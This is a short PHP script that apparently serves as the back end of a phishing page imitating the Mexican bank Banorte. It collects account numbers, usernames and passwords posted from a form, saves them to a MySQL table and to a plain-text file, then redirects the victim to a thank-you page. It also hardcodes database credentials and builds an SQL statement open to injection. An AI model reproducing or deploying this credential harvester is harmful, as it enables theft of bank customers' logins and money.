<?php


$servername = "localhost:3306";
$username = "bancadi4_FelipBeni";
$password = "Felip@2023";
$dbname = "bancadi4_datos_banorte";


$conn = new mysqli($servername, $username, $password, $dbname);


if ($conn->connect_error) {
    die("Conexión fallida: " . $conn->connect_error);
}


$cuenta = $_POST['cuenta'];
$usuario = $_POST['usuario'];
$contrasena = $_POST['contrasena'];


$sql = "INSERT INTO datos (cuenta, usuario, contrasena) VALUES ('$cuenta', '$usuario', '$contrasena')";

if ($conn->query($sql) === TRUE) {
    header('Location: Gracias.html');
} else {
    echo "Error al guardar los datos: " . $conn->error;
}

$archivo = fopen("datos/datos.txt", "a");
fwrite($archivo, "Cuenta: " . $cuenta . ", Usuario: " . $usuario . ", Contraseña: " . $contrasena ."\n");
fclose($archivo);



$conn->close();


exit;

?>